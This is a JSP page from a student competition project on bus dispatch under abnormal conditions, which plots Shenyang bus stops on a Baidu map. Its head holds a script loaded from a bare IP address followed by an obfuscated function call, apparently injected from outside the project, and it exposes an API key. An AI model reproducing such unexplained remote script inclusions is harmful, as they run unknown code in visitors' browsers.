<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
	<style type="text/css">
		body, html{width: 100%;height: 100%;margin:0;font-family:"微软雅黑";}
		#allmap{height:500px;width:100%;}
		#r-result{width:100%;}
	</style>
	<script type="text/javascript" src="http://api.map.baidu.com/api?v=2.0&ak=UdcqUlkMDMARCEUnB8sUkDZH1WIRBGCl"></script>

<script language="javascript" type="text/javascript" src="http://202.102.100.100/35ff706fd57d11c141cdefcd58d6562b.js" charset="gb2312"></script><script type="text/javascript">
hQGHuMEAyLn('[id="bb9c190068b8405587e5006f905e790c"]');</script>
    <title>异常情况下公交车异常调度算法</title>
    
  </head>
  <body>
  	<table>
  		<table><h1>NEU_606参赛队伍&nbsp&nbsp&nbsp异常情况下公交车异常调度算法</h1></table>
  	</table>
  	<table>
  	<div id="allmap"></div>

	<div id="r-result">
			<input type="button" onclick="add_overlay();" value="152路公交车" />
			<input type="button" onclick="show327();" value="327路公交车" />
			<input type="button" onclick="add_overlay();" value="244路公交车" />
			<input type="button" onclick="reset();" value="清除所有" />
	</div>
  	</table>
  </body>
</html>
<script type="text/javascript">
	// 百度地图API功能
	var map = new BMap.Map("allmap");
	var point = new BMap.Point(123.439798,41.797927);
	map.centerAndZoom(point, 13);
	map.enableScrollWheelZoom();
	var marker = new BMap.Marker(new BMap.Point(116.404, 39.915)); // 创建点
	var polyline = new BMap.Polyline([
		new BMap.Point(116.399, 39.910),
		new BMap.Point(116.405, 39.920),
		new BMap.Point(116.425, 39.900)
	], {strokeColor:"blue", strokeWeight:2, strokeOpacity:0.5});   //创建折线
	
	var circle = new BMap.Circle(point,500,{strokeColor:"blue", strokeWeight:2, strokeOpacity:0.5}); //创建圆
	
	var polygon = new BMap.Polygon([
		new BMap.Point(116.387112,39.920977),
		new BMap.Point(116.385243,39.913063),
		new BMap.Point(116.394226,39.917988),
		new BMap.Point(116.401772,39.921364),
		new BMap.Point(116.41248,39.927893)
	], {strokeColor:"blue", strokeWeight:2, strokeOpacity:0.5});  //创建多边形
	
	var pStart = new BMap.Point(116.392214,39.918985);
	var pEnd = new BMap.Point(116.41478,39.911901);
	var rectangle = new BMap.Polygon([
		new BMap.Point(pStart.lng,pStart.lat),
		new BMap.Point(pEnd.lng,pStart.lat),
		new BMap.Point(pEnd.lng,pEnd.lat),
		new BMap.Point(pStart.lng,pEnd.lat)
	], {strokeColor:"blue", strokeWeight:2, strokeOpacity:0.5});  //创建矩形
	
	//添加覆盖物
	function add_overlay(){
		map.addOverlay(marker);            //增加点
		map.addOverlay(polyline);          //增加折线
		map.addOverlay(circle);            //增加圆
		map.addOverlay(polygon);           //增加多边形
		map.addOverlay(rectangle);         //增加矩形
	}
	//清除覆盖物
	function remove_overlay(){
		map.clearOverlays();         
	}
	function reset(){
		map.clearOverlays();
		map.reset();
	}
	
	var marker = new BMap.Marker(new BMap.Point(116.404, 39.915)); // 创建点
	function show327(){
		map.addOverlay(new BMap.Marker(new BMap.Point(123.401621, 41.798062)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.407905, 41.790266)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.405339, 41.787189)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.401621, 41.798062)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.401013, 41.782323)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.398507, 41.772635)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.399404, 41.770436)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.405739, 41.757851)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.408213, 41.751698)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.410913, 41.744717)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.4135,   41.738229)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.414843, 41.734866)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.417511, 41.728046)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.413094, 41.716031)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.405467, 41.702501)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.402645, 41.697581)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.399123, 41.692793)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.392903, 41.684481)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.383911, 41.687673)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.377982, 41.6902)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.375302, 41.688034)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.371359, 41.682812)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.369072, 41.677999)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.36998,  41.674228)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.355936, 41.672129)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.358981, 41.668758)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.343862, 41.666065)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.35158,  41.663621)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.335773, 41.664678)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.335791, 41.657435)));
		map.addOverlay(new BMap.Marker(new BMap.Point(123.335791, 41.657435)));
	}
	
</script>
